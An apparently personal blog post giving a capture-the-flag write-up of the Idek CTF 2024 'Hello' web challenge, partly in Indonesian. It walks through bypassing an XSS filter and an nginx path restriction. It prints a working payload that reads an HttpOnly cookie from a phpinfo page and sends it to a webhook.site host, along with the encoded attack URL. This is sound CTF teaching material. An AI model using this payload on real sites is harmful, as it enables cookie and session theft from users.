---
layout: post
title: "Idek CTF 2024 - Hello [Web]"
date: 2024-08-18 00:00:00
description: "Idek CTF 2024 - Hello [Web] Writeup"
tag:
  - Web
---

After a long hiatus from updating articles, this time an update will cover the writeup for the Web Idek CTF 2024 challenge called 'Hello'. This article is being written because it is considered particularly interesting.

**Challenge Description:**\
`Just to warm you up for the next Fight :"D`
`Note: the admin bot is not on the same machine as the challenge itself and the .chal.idek.team:1337 URL should be used for the admin bot URL`

![Chall](http://idek-hello.chal.idek.team:1337/)
![Admin Bot](https://admin-bot.idek.team/idek-hello)
![Attachments](https://idekctf-challenges.storage.googleapis.com/uploads/f64f1dd16fae27e943a8f7dab349e00509f39c63bb2278328ac5783d867fa393/idek-hello.tar.gz)

**Analysis:**\
Since this challenge is a Whitebox challenge with the provided source code, a source code review must be conducted first. The structure of the provided source code files is as follows:

.
├── bot.js
├── docker-compose.yml
├── hello
│   ├── Dockerfile
│   ├── init.sh
│   ├── nginx.conf
│   └── src
│   ├── index.php
│   └── info.php
└── tes.md

3 directories, 8 files

Based on the file structure, there is a bot.js file, which likely indicates a typical client-side challenge.

**First Analysis on the bot.js:**

```javascript
...SNIP...
const visit = async () => {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: true,
            pipe: true,
            args: [
                "--no-sandbox",
                "--disable-setuid-sandbox",
                "--js-flags=--noexpose_wasm,--jitless",
            ],
            dumpio: true
        });

        const ctx = await browser.createBrowserContext();

        const page = await ctx.newPage();
        await page.goto(CHALLENGE_ORIGIN, { timeout: 3000 });
        await page.setCookie({ name: 'FLAG', value: 'idek{PLACEHOLDER}', httpOnly: true });
        await page.goto(TARGET_URL, { timeout: 3000, waitUntil: 'domcontentloaded' });
        await sleep(5000);

        await browser.close();
        browser = null;
    } catch (err) {
        console.log(err);
    } finally {
        if (browser) await browser.close();
    }
};
...SNIP...
```

According to the bot.js file, the FLAG is located in the bot’s cookies, which are simulated as Admin user. Given that the FLAG is stored in a cookie, it can be inferred that this is a Cross-site Scripting (XSS) challenge. However, it is important to note that the cookie has the 'httponly' attribute set to 'true'. This means there is protection in place, preventing the stealing of cookies using JavaScript's document.cookie.

Based on an article from ![HackCommander](https://hackcommander.github.io/posts/2022/11/12/bypass-httponly-via-php-info-page/), it is possible to bypass HttpOnly and exfiltrate cookies via the PHP Info page.

**Second Analysis on the index.php:**

```php
<?php

function Enhanced_Trim($inp) {
    $trimmed = array("\r", "\n", "\t", "/", " ");
    return str_replace($trimmed, "", $inp);
}

if(isset($_GET['name']))
{
    $name=substr($_GET['name'],0,23);
    echo "Hello, ".Enhanced_Trim($_GET['name']);
}

?>
```

In the index.php file, there is a Cross-site Scripting (XSS) vulnerability in the 'name' parameter, which renders user input. However, there is a filter in the Enhanced_Trim function that prevents the use of characters such as '\r', '\n', '\t', '/', and ' ' (spaces) for constructing the XSS payload.

**Third Analysis on the nginx.conf:**

```bash
...SNIP...
location = /info.php {
allow 127.0.0.1;
deny all;
}

location ~ \.php$ {
root    /usr/share/nginx/html;
fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;
include fastcgi_params;
fastcgi_pass unix:/var/run/php/php8.2-fpm.sock;
...SNIP...
```

In the Nginx configuration file, there is a vulnerability related to unsafe path restrictions to the /info.php endpoint. Without further research, it might seem that the info.php file is not the way to obtain the FLAG in the Admin’s cookies. However, as outlined in the ![HackCommander](https://hackcommander.github.io/posts/2022/11/12/bypass-httponly-via-php-info-page/) cookies can be exfiltrated via the PHP Info page, making this page highly valuable. It is also noted that the website is using PHP-FPM..

**How to Solve?**\
Dari hasil analisa yang telah kita lakukan, dapat kita urutkan langkah penyelesaiannya sebagai berikut:

1. Bypass Cross-site-Scripting (XSS) filter pada endpoint /index.php dengan parameter "name" => http://target/index.php?name=payload
2. Bypass Unsafe Path Restriction untuk bisa akses info.php page => http://target/info.php
3. Exfiltrate Admin Cookies via PHP info page

Karena alurnya sudah kita ketahui, langsung saja kita lakukan exploitasi.

**Bypass Filter XSS:**

1. Bypass " " (spasi) menggunakan null byte %0, referensi dari ![ctftime](https://ctftime.org/writeup/32720)
2. Bypass "/" (slash) menggunakan String.fromCharCode

**Bypass Path Restriction Nginx PHP-FPM:**

1. Akses ke /info.php yang seharusnya hanya diperbolehkan dari 127.0.0.1 dapat di bypass dengan Path Manipulation => http://target/info.php/index.php ![sumber](https://book.hacktricks.xyz/pentesting-web/proxy-waf-protections-bypass)

**Final Payload:**\
Dari teknik bypass yang ditemukan, terbentuklah payload XSS untuk stealing cookies dari PHP info page menggunakan regex sebagai berikut:

```javascript
// Ubah menjadi decimal
fetch("http://idek-hello.chal.idek.team:1337/info.php/index.php")
  .then((response) => response.text())
  .then((data) => {
    const regex = /idek\{.*?\}/g;
    const matches = data.match(regex);
    if (matches) {
      fetch(
        "https://webhook.site/e9f955cb-6075-43a9-a58a-521db006edcd" +
          "?encodedMatches=" +
          btoa(matches),
        { method: "GET" }
      );
    }
  });

// Payload final yang di submit ke bot Admin
http://idek-hello.chal.idek.team:1337/?name=<svg%0Conload=javascript:eval(String.fromCharCode(102,101,116,99,104,40,39,104,116,116,112,58,47,47,105,100,101,107,45,104,101,108,108,111,46,99,104,97,108,46,105,100,101,107,46,116,101,97,109,58,49,51,51,55,47,105,110,102,111,46,112,104,112,47,105,110,100,101,120,46,112,104,112,39,41,46,116,104,101,110,40,114,101,115,112,111,110,115,101,32,61,62,32,114,101,115,112,111,110,115,101,46,116,101,120,116,40,41,41,46,116,104,101,110,40,100,97,116,97,32,61,62,32,123,99,111,110,115,116,32,114,101,103,101,120,32,61,32,47,105,100,101,107,92,123,46,42,63,92,125,47,103,59,99,111,110,115,116,32,109,97,116,99,104,101,115,32,61,32,100,97,116,97,46,109,97,116,99,104,40,114,101,103,101,120,41,59,105,102,32,40,109,97,116,99,104,101,115,41,32,123,102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,119,101,98,104,111,111,107,46,115,105,116,101,47,101,57,102,57,53,53,99,98,45,54,48,55,53,45,52,51,97,57,45,97,53,56,97,45,53,50,49,100,98,48,48,54,101,100,99,100,39,32,43,32,39,63,101,110,99,111,100,101,100,77,97,116,99,104,101,115,61,39,32,43,32,98,116,111,97,40,109,97,116,99,104,101,115,41,44,32,123,32,109,101,116,104,111,100,58,32,39,71,69,84,39,32,125,41,59,125,125,41,59))>
```

Tinggal kirimkan payload final ke Admin Bot, setelah itu Bot akan trigger payload tersebut untuk exfiltrate FLAG via PHP info page dan flag kita dapatkan di webhook.
![Webhook](/assets/img/Idek-CTF-2024-Hello/flag.png)

**Flag**:idek{Ghazy_N3gm_Elbalad},idek{Ghazy_N3gm_Elbalad}
